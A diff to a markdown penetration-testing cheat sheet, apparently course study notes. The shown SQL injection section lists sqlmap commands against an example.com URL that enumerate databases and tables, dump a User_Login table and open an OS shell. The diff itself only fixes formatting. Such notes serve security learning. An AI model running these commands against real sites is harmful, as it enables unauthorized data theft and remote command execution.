@@ -244,12 +244,10 @@ adb pull sdcard/log. txt /home/murphy/Desktop
     
 ## Module 15: SQL Injection
 - ### SQLMAP Extract DBS
-- 
 ```bash
 sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
 ```
 - ### Extract Tables
-- 
 ```bash
 sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
 ```
@@ -262,6 +260,7 @@ sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies x
 sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
 ```
 - ### OS Shell to execute commands
+```bash
 sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
 ```
 - ### Login bypass
